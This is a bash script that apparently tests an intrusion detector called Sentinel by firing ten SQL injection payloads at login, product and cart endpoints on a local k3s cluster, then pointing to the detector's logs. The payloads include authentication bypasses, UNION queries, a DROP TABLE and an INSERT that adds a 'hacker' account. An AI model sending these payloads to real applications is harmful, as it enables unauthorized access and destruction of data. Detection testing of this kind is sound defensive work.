#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${RED}========================================${NC}"
echo -e "${RED}  SQL Injection Attack Simulation      ${NC}"
echo -e "${RED}========================================${NC}"
echo ""

# Get manager endpoint
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}' 2>/dev/null)
MANAGER_URL="http://${NODE_IP}:30000"

if [ -z "$NODE_IP" ]; then
    echo -e "${RED}Error: Could not get node IP. Is k3s running?${NC}"
    exit 1
fi

echo -e "${BLUE}Target: ${MANAGER_URL}${NC}"
echo -e "${YELLOW}Simulating SQL injection attacks...${NC}"
echo ""

# SQL injection payloads
SQL_PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' UNION SELECT * FROM users--"
    "admin' --"
    "1' AND 1=1--"
    "' OR 'a'='a"
    "1' UNION SELECT NULL, NULL, NULL--"
    "' DROP TABLE users--"
    "'; INSERT INTO users VALUES ('hacker', 'password')--"
    "1' OR '1'='1' /*"
)

ATTACK_COUNT=0

echo -e "${YELLOW}Sending SQL injection attempts...${NC}"
for payload in "${SQL_PAYLOADS[@]}"; do
    ENCODED_PAYLOAD=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g" | sed 's/"/%22/g' | sed 's/;/%3B/g' | sed 's/--/%2D%2D/g')

    # Try different endpoints
    ENDPOINTS=(
        "/api/products?id=${ENCODED_PAYLOAD}"
        "/api/login?username=admin&password=${ENCODED_PAYLOAD}"
        "/api/cart?item=${ENCODED_PAYLOAD}"
    )

    for endpoint in "${ENDPOINTS[@]}"; do
        ATTACK_COUNT=$((ATTACK_COUNT + 1))

        # Send attack
        RESPONSE=$(curl -s -w "\n%{http_code}" "${MANAGER_URL}${endpoint}" 2>/dev/null)
        HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)

        if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "404" ]; then
            echo -e "${RED}[ATTACK $ATTACK_COUNT] ${endpoint}${NC}"
        else
            echo -e "${YELLOW}[ATTACK $ATTACK_COUNT] ${endpoint} (HTTP ${HTTP_CODE})${NC}"
        fi

        # Small delay to avoid overwhelming
        sleep 0.2
    done
done

echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack Summary                        ${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "${GREEN}Total attacks sent: ${ATTACK_COUNT}${NC}"
echo -e "${YELLOW}Sentinel should detect SQLi patterns.${NC}"
echo ""

echo -e "${YELLOW}Check Sentinel logs:${NC}"
echo -e "  kubectl logs -l app=sentinel -f"
echo ""

echo -e "${YELLOW}Check if IP was blocked:${NC}"
echo -e "  kubectl logs -l app=manager | grep block_ip"
echo ""

echo -e "${YELLOW}View Controller dashboard:${NC}"
echo -e "  http://${NODE_IP}:30090"
echo ""
